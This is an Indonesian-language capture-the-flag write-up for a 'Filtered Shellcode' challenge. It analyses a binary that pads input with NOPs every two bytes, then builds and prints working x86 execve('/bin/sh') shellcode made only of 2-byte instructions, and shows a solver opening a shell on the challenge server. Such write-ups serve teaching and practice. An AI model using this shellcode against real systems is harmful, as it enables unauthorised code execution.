# Filtered Shellcode

## note
format flag picoctf{} sudah berubah jadi academy{} pra 2026-09-24 ini.

# file & nc connection attached

first download binary untuk debugging lokal, lalu leak informasi umum seperti metadata dan proteksi yang dimiliki file binary tersebut:

```
└> file fun ; pwn checksec fun
fun: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=c0f409fa53f56e18ae974964b44cb8117146757d, for GNU/Linux 3.2.0, not stripped
[*] '/home/rotalactf/reno/pwn/picoctf/f-shell/fun'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

hasil nya kita bisa mengetahui bahwa program ini adalah x86 (32 bit) dan tidak memiliki proteksi apapun. sesuai nama chall nya **Filtered Shellcode** aku berasumsi bahwa chall
ini akan melakukan validasi input sebelum mengeksekusinya sebagai shellcode. 

lanjut analisis aku menjalankan program nya untuk melihat apa yang dilakukan olehnya.

```
└> ./fun
Give me code to run:
cat flag.txt    <-- input ku 
[1]    2874 segmentation fault (core dumped)  ./fun
```
wel program langsung crash. sepertinya ia melakukan sesuatu dengan inputku. dan menurut teks yang dicetak : **Give me code to run:** sepertinya program ini mengharapkan user 
menginput sebuah code , seperti... shellcode!

aku coba decompile pakai ghidra untuk melihat code C nya, karena dari metadata nya tadi program binary ini tertulis not stripped, maka symbol & nama fungsi tidak hilang.

di program ini hanya ada fungsi :
- main
- execute

execute terdengar menarik untuk di analisis

decompile execute()
```C
void execute(int param_1,int param_2)

{
  int iVar1;
  uint uVar2;
  undefined1 *puVar3;
  undefined1 auStack_2c [0x8];
  undefined1 *local_24;
  undefined1 *local_20;
  uint local_1c;
  uint local_18;
  uint local_14;
  int local_10;
  
  puVar3 = auStack_2c;
  if ((param_1 != 0x0) && (param_2 != 0x0)) {
    local_18 = param_2 * 0x2;
    local_1c = local_18;
    uVar2 = ((local_18 + 0x10) / 0x10) * 0x10;
    for (; puVar3 != auStack_2c + -(uVar2 & 0xfffff000); puVar3 = puVar3 + -0x1000) {
      *(undefined4 *)(puVar3 + -0x4) = *(undefined4 *)(puVar3 + -0x4);
    }
    iVar1 = -(uVar2 & 0xfff);
    if ((uVar2 & 0xfff) != 0x0) {
      *(undefined4 *)(puVar3 + ((uVar2 & 0xfff) - 0x4) + iVar1) =
           *(undefined4 *)(puVar3 + ((uVar2 & 0xfff) - 0x4) + iVar1);
    }
    local_10 = 0x0;
    for (local_14 = 0x0; local_14 < local_18; local_14 = local_14 + 0x1) {
      if ((int)local_14 % 0x4 < 0x2) {
        puVar3[local_14 + iVar1] = *(undefined1 *)(param_1 + local_10);
        local_10 = local_10 + 0x1;
      }
      else {
        puVar3[local_14 + iVar1] = 0x90;
      }
    }
    puVar3[local_18 + iVar1] = 0xc3;
    local_24 = puVar3 + iVar1;
    local_20 = puVar3 + iVar1;
    *(undefined4 *)(puVar3 + iVar1 + -0x4) = 0x80492b2;
    (*(code *)(puVar3 + iVar1))();
    return;
  }
                    /* WARNING: Subroutine does not return */
  exit(0x1);
}
```

g jadi.

membaca hasil decompile ini masih cukup sulit bagiku. tapi setelah di teliti ternyata tidak semua di program itu penting, aku sudah dapatkan inti filternya yaitu ada di
**perulangan for** :

```C
    for (local_14 = 0x0; local_14 < local_18; local_14 = local_14 + 0x1) {
      if ((int)local_14 % 0x4 < 0x2) {
        puVar3[local_14 + iVar1] = *(undefined1 *)(param_1 + local_10);
        local_10 = local_10 + 0x1;
      }
      else {
        puVar3[local_14 + iVar1] = 0x90; 
      }
    }
```

```
if ((int)local_14 % 0x4 < 0x2)
  puVar3[local_14 + iVar1] = *(undefined1 *)(param_1 + local_10);
```
jika index = 0 atau 1 copy ascii asli dari input ke puVar3 

```
else
  puVar3[local_14 + iVar1] = 0x90; 
```
ubah index ke 2 dan 3 jadi 0x90, 0x90 itu apa? dari internet aku mendapatkan info bahwa 0x90 adalah byte code dari nop / no operation. like do nothing nya program.
<p align="center"><img width="717" height="374" alt="image" src="https://github.com/user-attachments/assets/b9e60635-3b7d-4a01-ba9c-e27087a6d931" /> </p>

efeknya jika aku input shellcode, well gaada si. tapi yang mengkhawatirkan adalah indexnya. artinya tiap shellcode ku instruksi yang memiliki panjang lebih dari index 1 alias 
2 byte , maka akan kepotong oleh nop dan jadi instruksi nya bisa rusak. 

harusnya akan lebih mudah jika melihat dan memahaminya pakai gdb :

## GDB analysis

tentu pertama aku disass dulu fungsi execute untuk mencari titik breakpoint yang aman. dan aku menemukannya di **execute+279** karena itu tepat sebelum input yang aku masukkan di
call / di eksekusi
```Assembly
   0x080492ad <+279>:   mov    eax,DWORD PTR [ebp-0x20]
   0x080492b0 <+282>:   call   eax
```

pasang breakpoint
```
pwndbg> b execute
Breakpoint 1 at 0x804919a
pwndbg> b *execute+279
Breakpoint 2 at 0x80492ad
pwndbg> r
```
**note : setelah dijalankan program akan meminta input dulu baru break, saranku masukkan input yang akan menghasilkan noticeable pattern like AAAA atau sebagainya.
disini aku pakai DDDDDDDD , : 0x444444--- dalam hex**


## breakpoint 1 : before filter
```Assembly
pwndbg> hexdump 0xffffcb10 <- stack tempat input disimpan (bisa di ambil dengan mudah pakai plugin pwndbg)
+0000 0xffffcb10  23 cb ff ff  10 00 00 00  ff ff ff ff  d4 92 04 08  │#...│....│....│....│
+0010 0xffffcb20  00 14 fc 44  44 44 44 44  44 44 44 44  44 44 44 44  │...D│DDDD│DDDD│DDDD│
+0020 0xffffcb30  44 44 44 f7  00 20 00 00  01 00 00 00  f4 74 fd f7  │DDD.│....│....│.t..│
+0030 0xffffcb40  21 99 fc f7  e8 d5 ff f7  e8 d5 ff f7  39 7b fd f7  │!...│....│....│9{..│
```

## breakpoint 2 : after filter
```Assembly
pwndbg> stack 1
00:0000│ eax ecx edx esp 0xffffcac0 ◂— 0x90904444 <--- pattern 4444!! itu huruf DD !

pwndbg> hexdump 0xffffcac0
+0000 0xffffcac0  44 44 90 90  44 44 90 90  44 44 90 90  44 44 90 90  │DD..│DD..│DD..│DD..│
+0010 0xffffcad0  c3 0e d8 f7  20 5f df f7  14 00 00 00  a2 91 04 08  │....│._..│....│....│
+0020 0xffffcae0  a8 67 fa f7  60 cb ff f7  c0 ca ff ff  c0 ca ff ff  │.g..│`...│....│....│
+0030 0xffffcaf0  10 00 00 00  10 00 00 00  10 00 00 00  08 00 00 00  │....│....│....│....│

```
well terlihat ? inputku kepotong per dua byte, diselipin 0x90 alias nop di tengah. bayangkan jika itu adalah instruksi dengan panjang 1 atau 3 byte, maka instruksi nya
akan kepotong potong dan jadi ga valid.

maka dengan ini aku harus menulis shellcode secara manual dengan bahasa assembly.

rencana nya :
- memasukkan string /bin/sh\00 ke stack
- set register eax,ebx,ecx,dan edx untuk persiapan syscall
- call syscall_execve(/bin/sh)

dan pastikan semua code ditulis dalam instruksi 2 byte, ini cukup sulit.tapip masih bisa dilakukan. 

berikut kode asm:

perlu diingat bahwa register yang digunakan untuk syscal harus steril dulu, bisa pakai xor reg ,reg . dan kode syscall untuk execve() adalah 0xb (di x86 / 32bit)

```Assembly
xor eax,eax
mov al,0xb
xor ecx,ecx
xor edx,edx
```
bagian rumit nya adalah pada penulisan string /bin/sh ke stack. intinya aku lakukan shift left sebanyak 8 dan 16 kali untuk menggeser posisi karakter ke tempat yang benar agar 
tidak ketimpa karakter lain yang akan ku tulis. cara normal membutuhkan instruksi dengan panjang lebih dari 2 byte jadi ini adalah salah satu cara menulis teks ke stack hanya dengan
instruksi 2 byte.

string /sh\00
```Assembly
xor ebx, ebx
mov bh, 0x68 <- huruf h
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
mov bh, 0x73 <- huruf s
mov bl, 0x2f <- char '/'
push ebx <- tulis ke stack , btw ini 1 byte jadi ku tambahin nop agar jadi 2 byte 
nop
```
aku lakukan hal yang sama untuk string /bin
```Assembly

xor ebx, ebx
mov bh, 0x6e
mov bl, 0x69
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx

shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
mov bh, 0x62
mov bl, 0x2f
push ebx
nop

mov ebx, esp
int 0x80 <- interupt 0x80. intinya manggil agar program dateng ke sini untuk eksekusi stack nya
```
aku ubah ini jadi bytes string di website [ini](https://defuse.ca/online-x86-assembler.htm#disassembly). dan ambil string  nya 

string : 
```
"\x31\xC0\xB0\x0B\x31\xC9\x31\xD2\x31\xDB\xB7\x68\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xB7\x73\xB3\x2F\x53\x90\x31\xDB\xB7\x6E\xB3\x69\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xB7\x62\xB3\x2F\x53\x90\x89\xE3\xCD\x80"
```

selanjutnya buat skrip python untuk mengirim shellcode ini, 
[solver](solver.py)

```
└> python3 solver.py
[*] '/home/rotalactf/reno/pwn/picoctf/f-shell/fun'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
82
/home/rotalactf/reno/pwn/picoctf/f-shell/solver.py:10: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  pay = flat(shell)
[+] Opening connection to xebec.cylabacademy.net on port 46140: Done
[*] Switching to interactive mode
Give me code to run:
$ ls
Dockerfile
Makefile
flag.txt
fun
fun.c
start.sh
$ cat flag.txt
academy{...................................}
$
[*] Closed connection to xebec.cylabacademy.net port 46140
```

well done
flag : **academy{.................................}**
